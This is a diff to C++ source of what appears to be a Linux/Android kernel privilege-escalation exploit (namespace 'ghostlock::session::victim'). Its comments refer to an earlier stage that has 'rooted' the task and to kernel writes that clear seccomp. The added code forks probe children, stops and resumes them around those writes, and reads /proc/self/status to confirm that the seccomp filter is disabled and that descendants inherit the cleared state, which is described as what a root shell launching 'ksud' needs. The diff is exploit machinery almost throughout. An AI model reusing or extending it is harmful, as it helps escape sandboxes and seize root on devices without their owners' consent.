@@ -10,8 +10,41 @@
 #include "support/native_resource.hpp"
 
 #include <array>
+#include <cerrno>
+#include <cstdlib>
+#include <string>
+#include <poll.h>
+#include <signal.h>
+#include <string_view>
+#include <sys/wait.h>
 
 namespace ghostlock::session::victim {
+    /* seccomp.mode as the kernel reports it for ourselves: 0 disabled,
+     * 2 filter; -1 when the field is unreadable. The status file is read in
+     * full: "Seccomp:" sits near the end and a short buffer would truncate it. */
+    static int32_t read_self_seccomp_mode(void) {
+        support::UniqueFd status(open("/proc/self/status", O_RDONLY | O_CLOEXEC));
+        if (!status.valid()) return -1;
+        std::string text;
+        constexpr size_t kMaxStatusBytes = 65536;
+        std::array<char, 2048> chunk{};
+        for (;;) {
+            const ssize_t n = read(status.get(), chunk.data(), chunk.size());
+            if (n > 0) {
+                text.append(chunk.data(), static_cast<size_t>(n));
+                if (text.size() > kMaxStatusBytes) break;
+                continue;
+            }
+            if (n < 0 && errno == EINTR) continue;
+            break;
+        }
+        if (text.empty()) return -1;
+        const std::string_view view(text);
+        const size_t at = view.find("\nSeccomp:");
+        if (at == std::string_view::npos) return -1;
+        const char *value = view.data() + at + sizeof("\nSeccomp:");
+        return static_cast<int32_t>(strtol(value, nullptr, 10));
+    }
     /* rooted exits kfree the static init_cred (w2 stores it with no
  * get_cred). park forever, oom_score_adj -1000 so lmkd skips us. */
     static void park_child_process_forever(void) {
@@ -83,6 +116,23 @@ namespace ghostlock::session::victim {
                     close(probe_pipe[0]);
                 }
                 write(p.uid_write.get(), &code, sizeof(code));
+            } else if (cmd == 'K') {
+                /* Forked-inheritance probe: a child of a DISABLED task must
+             * report mode 0 as well, because a fork re-arms TIF_SECCOMP only
+             * while the mode is not DISABLED. The verdict travels as the exit
+             * status, so no pipe can leak a stale read. */
+                uint32_t mode = 0xffffffffU;
+                const pid_t probe = fork();
+                if (probe == 0) {
+                    _exit(static_cast<int32_t>(read_self_seccomp_mode()) & 0xff);
+                }
+                if (probe > 0) {
+                    int32_t st = 0;
+                    if (waitpid(probe, &st, 0) == probe && WIFEXITED(st)) {
+                        mode = static_cast<uint32_t>(WEXITSTATUS(st));
+                    }
+                }
+                write(p.uid_write.get(), &mode, sizeof(mode));
             } else if (cmd == 'M') {
                 /* Report comm length + first byte to tell which side a leaf=1 write
              * landed: comm "ghostleaf_012345" zeroed at [target] reads len 0, at
@@ -101,6 +151,14 @@ namespace ghostlock::session::victim {
                 uint32_t report =
                         (static_cast<uint32_t>(len) << 8) | static_cast<uint32_t>(static_cast<unsigned char>(comm[0]));
                 write(p.uid_write.get(), &report, sizeof(report));
+            } else if (cmd == 'S') {
+                /* W3 sanitize window. Park this task in a group stop so no
+             * syscall of ours can observe an intermediate seccomp state while
+             * the kernel writes land; the parent resumes us with SIGCONT and
+             * then reads the mode we report. */
+                raise(SIGSTOP);
+                uint32_t mode = static_cast<uint32_t>(read_self_seccomp_mode());
+                write(p.uid_write.get(), &mode, sizeof(mode));
             } else if (cmd == 'P') {
                 /* w2 rooted this task; park */
                 p.cmd_read.reset();
@@ -223,36 +281,103 @@ namespace ghostlock::session::victim {
         return 1;
     }
 
-    int32_t verify_seccomp_probe_stage(void *context) {
+    int32_t stop_child(VictimContext &p) {
+        const pid_t child = p.child();
+        if (child <= 0) return 0;
+        if (write(p.cmd_write.get(), "S", 1) != 1) {
+            pr_warning("W3: cannot send the sanitize stop to child %d errno=%d\n",
+                       child, errno);
+            return 0;
+        }
+        int32_t status = 0;
+        pid_t waited;
+        do {
+            waited = waitpid(child, &status, WUNTRACED);
+        } while (waited < 0 && errno == EINTR);
+        if (waited != child) {
+            pr_warning("W3: child %d did not reach the sanitize stop errno=%d\n",
+                       child, errno);
+            p.mark_child_exited();
+            return 0;
+        }
+        if (!WIFSTOPPED(status)) {
+            pr_warning("W3: child %d left before the sanitize stop status=0x%x\n",
+                       child, status);
+            p.mark_child_exited();
+            return 0;
+        }
+        pr_info("W3: child %d stopped for the seccomp clear\n", child);
+        return 1;
+    }
+
+    int32_t continue_and_report_seccomp(VictimContext &p) {
+        const pid_t child = p.child();
+        if (child <= 0) return -1;
+        if (kill(child, SIGCONT) != 0) {
+            pr_warning("W3: SIGCONT child %d failed errno=%d\n", child, errno);
+            return -1;
+        }
+        struct pollfd ready_fd = {
+            .fd = p.uid_read.get(), .events = POLLIN, .revents = 0,
+        };
+        const int32_t ready = poll(&ready_fd, 1, 5000);
+        if (ready <= 0) {
+            pr_warning("W3: no seccomp report from child %d poll=%d errno=%d\n",
+                       child, ready, errno);
+            return -1;
+        }
+        uint32_t mode = 0xffffffffU;
+        if (read(p.uid_read.get(), &mode, sizeof(mode)) !=
+            static_cast<ssize_t>(sizeof(mode))) {
+            return -1;
+        }
+        return static_cast<int32_t>(mode);
+    }
+
+    int32_t verify_fork_seccomp_stage(void *context) {
         auto *stage = static_cast<struct w2_stage_context *>(context);
-        if (write(stage->pipes.cmd_write.get(), "F", 1) != 1) return 0;
+        if (write(stage->pipes.cmd_write.get(), "K", 1) != 1) return 0;
+
+        uint32_t mode = 0xffffffffU;
+        if (read(stage->pipes.uid_read.get(), &mode, sizeof(mode)) !=
+            static_cast<ssize_t>(sizeof(mode))) {
+            return 0;
+        }
+        pr_info("forked child reports Seccomp: %d\n", static_cast<int32_t>(mode));
+        /* The decisive check: kernel/fork.c copy_seccomp() re-arms TIF_SECCOMP
+         * in every child while seccomp.mode != DISABLED, so a child that reports
+         * mode 0 proves the clear reached the descendants - which is exactly
+         * what `sh -> ksud` needs. Unlike the finit_module errno (see
+         * probe_finit_module_stage) this result is unambiguous. */
+        if (mode != 0) {
+            pr_warning("forked child still filtered (mode=%d); descendants would "
+                       "re-arm TIF_SECCOMP\n", static_cast<int32_t>(mode));
+            return 0;
+        }
+        pr_success("forked child inherits mode=0 (copy_seccomp stops re-arming)\n");
+        return 1;
+    }
+
+    void probe_finit_module_stage(void *context) {
+        auto *stage = static_cast<struct w2_stage_context *>(context);
+        if (write(stage->pipes.cmd_write.get(), "F", 1) != 1) return;
 
         uint32_t code = 0;
         if (read(stage->pipes.uid_read.get(), &code, sizeof(code)) !=
             static_cast<ssize_t>(sizeof(code))) {
-            return 0;
+            return;
         }
-        pr_info("seccomp finit_module probe = 0x%x\n", code);
+        pr_info("finit_module probe errno field = 0x%x (informational)\n", code);
         /* Corrected interpretation (the previous comment was wrong):
          *
-         * A SECCOMP_RET_KILL/SIGSYS action terminates the thread; it cannot
-         * return an errno, so 0xfffffffd is NOT a SIGSYS marker. It is -ESRCH.
-         * The filter's RET_ERRNO actions surface as ordinary negative errnos
-         * (commonly -ENOSYS = 38, sometimes -EPERM).
-         *
-         * The ambiguity matters: an UNFILTERED finit_module also returns -ESRCH
-         * for a bogus fd, so a -ESRCH result cannot distinguish "the filter
-         * blocked it" from "the syscall ran and rejected the arguments". This
-         * probe therefore proves success (code == 0) but never proves that the
-         * filter is still active. It is kept conservative -- every non-zero
-         * result is treated as "not bypassed" -- and must not be cited as
-         * evidence that seccomp is still armed. */
-        if (code == 0xfffffffd || code == 0xfffffffe || code == 0xffffffff ||
-            code == 1 || code == 38) {
-            return 0;
-        }
-        pr_success("child seccomp filter bypassed (finit_module errno=%u)\n", code);
-        return 1;
+         * A SECCOMP_RET_KILL action terminates the thread and cannot return an
+         * errno, so 0xfffffffd is NOT a SIGSYS marker - it is -ESRCH. The
+         * filter's RET_ERRNO actions surface as ordinary negative errnos
+         * (commonly -ENOSYS = 38, sometimes -EPERM), and an UNFILTERED
+         * finit_module also returns -ESRCH for a bogus fd. The value therefore
+         * cannot separate "the filter blocked it" from "the syscall ran and
+         * rejected its arguments", so this line is logged for the record only;
+         * verify_fork_seccomp_stage() is the verdict. */
     }
 
     int32_t verify_leaf_dir_stage(void *context) {
